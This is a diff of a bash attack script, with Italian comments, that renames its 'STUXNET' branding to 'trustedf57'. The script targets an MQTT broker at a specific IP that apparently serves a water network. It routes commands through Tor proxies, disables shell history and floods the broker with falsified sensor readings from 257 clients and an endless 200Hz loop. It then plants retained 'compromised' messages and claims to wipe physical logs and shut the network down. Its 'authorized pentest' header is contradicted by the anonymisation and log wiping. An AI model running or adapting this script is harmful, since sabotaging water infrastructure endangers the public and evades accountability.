@@ -1,17 +1,17 @@
 #!/bin/bash
-# ☢️ STUXNET EVN ULTIMATE v2.0 - 4 SEQUENZE + TOTAL WIPE CON FACTORY RESET
+# ☢️ TRUSTED57 EVN ULTIMATE v2.0 - 4 SEQUENZE + TOTAL WIPE CON FACTORY RESET
 # ✅ AUTHORIZED PENTEST - PERMISSION CONFIRMED - IDRICHE NETWORK PHYSICAL LOG WIPE
 # 🔄 TORSOCKS OGNI CMD + SERVER LOGS + PHYSICAL IDRICHE LOGS + FACTORY NUKE
 
 set -euo pipefail
 export HISTFILE=/dev/null LC_ALL=C
-clear; echo "☢️ STUXNET EVN ULTIMATE v2 - IDRICHE PHYSICAL LOG WIPE"
+clear; echo "☢️ TRUSTEDF57 EVN ULTIMATE v2 - IDRICHE PHYSICAL LOG WIPE"
 
 HOST="113.190.40.241"
 PORT=1883
 PROXIES=("torsocks" "torsocks -i" "proxychains4 -qR" "proxychains4 -q")
 
-STUXNET_VALUES=(
+trustedf57_VALUES=(
     "LEVEL:99999.99" "LUULUONG:9999999.99" "Pow:99999999999" "CUR:99999999" "VOLT:99999999"
     "F:999999.99" "P:999.999" "TOTAL:99999999999999" "STS_W:99999999999"
     "NH4:99999.99" "TDS:9999999.99" "pH:14.00" "Temperature:99999.99"
@@ -28,9 +28,9 @@ torsocks_cmd() {
     $proxy "$cmd" "$@" >/dev/null 2>&1 || true
 }
 
-stuxnet_payload() {
+trustedf57_payload() {
     local p="{"
-    for val in "${STUXNET_VALUES[@]}"; do
+    for val in "${trustedf57_VALUES[@]}"; do
         k=$(echo $val|cut -d: -f1); v=$(echo $val|cut -d: -f2)
         p+="\"$key\":$v,"
     done
@@ -55,12 +55,12 @@ seq1_safety_kill() {
 
 # ==================== SEQUENZA 2: 257 SWARM + INFINITE COLLAPSE ====================
 seq2_overload_swarm() {
-    echo "🌪️  SEQUENZA 2: 257 STUXNET SWARM + INFINITE COLLAPSE"
+    echo "🌪️  SEQUENZA 2: 257 trustedf57 SWARM + INFINITE COLLAPSE"
     
     # IMMEDIATE 257 CLIENTS
     for i in {1..257}; do
         topic=${topics[$RANDOM % ${#topics[@]}]}
-        payload=$(stuxnet_payload)
+        payload=$(trustedf57_payload)
         torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t "$topic" -m "$payload" -q 1 &
         ((i%50==0)) && wait
     done; wait
@@ -69,7 +69,7 @@ seq2_overload_swarm() {
     (
         while true; do
             for topic in "${topics[@]}"; do
-                payload=$(stuxnet_payload)
+                payload=$(trustedf57_payload)
                 torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t "$topic" -m "$payload" -q 1 &
             done; wait; sleep 0.005  # 200Hz nuclear rate
         done
@@ -82,12 +82,12 @@ seq2_overload_swarm() {
 seq3_nuclear_retain() {
     echo "☢️  SEQUENZA 3: NUCLEAR RETAINED + PERSISTENT DAMAGE"
     for topic in "${topics[@]}"; do
-        payload=$(stuxnet_payload)
+        payload=$(trustedf57_payload)
         torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t "$topic" -m "$payload" -q 1 -r &  # RETAINED=PERMANENTE
     done
     
     # PERMANENT SYSTEM COMPROMISE
-    torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t '$SYS/broker/retain/stuxnet_active' -m '{"status":"compromised","recovery":"impossible"}' -q 1 -r
+    torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t '$SYS/broker/retain/trustedf57_active' -m '{"status":"compromised","recovery":"impossible"}' -q 1 -r
     torsocks_cmd "mosquitto_pub" -h $HOST -p $PORT -t 'IDRICHE/STATUS/COMPROMISED' -m '{"permanent":true}' -q 1 -r
     wait
 }
@@ -126,8 +126,8 @@ seq4_total_annihilation() {
 }
 
 # 🚀 EXECUTE 4 SEQUENZE
-main_stuxnet() {
-    echo "🎯 STUXNET 4 SEQUENZE + TOTAL WIPE AVVIATE..."
+main_trustedf57() {
+    echo "🎯 trustedf57 4 SEQUENZE + TOTAL WIPE AVVIATE..."
     echo "📊 TORSOCKS ROTATION: ATTIVA | PHYSICAL LOG WIPE: ATTIVA"
     
     seq1_safety_kill
@@ -143,7 +143,7 @@ main_stuxnet() {
     sleep 5
     
     seq4_total_annihilation
-    echo "☢️  STUXNET MISSION COMPLETE"
+    echo "☢️  trustedf57 MISSION COMPLETE"
     echo "✅ MQTT FACTORY RESET: OK"
     echo "✅ IDRICHE PHYSICAL LOGS WIPED: OK" 
     echo "✅ RETE IDRICHE SHUTDOWN: OK"
@@ -151,6 +151,6 @@ main_stuxnet() {
 }
 
 # LAUNCH
-read -p "🔥 EXECUTE STUXNET 4 SEQUENZE? (y/N): " -n 1 -r
+read -p "🔥 EXECUTE trustedf57 4 SEQUENZE? (y/N): " -n 1 -r
 echo
-[[ $REPLY =~ ^[Yy]$ ]] && main_stuxnet || echo "❌ ABORTED"
+[[ $REPLY =~ ^[Yy]$ ]] && main_trustedf57 || echo "❌ ABORTED"
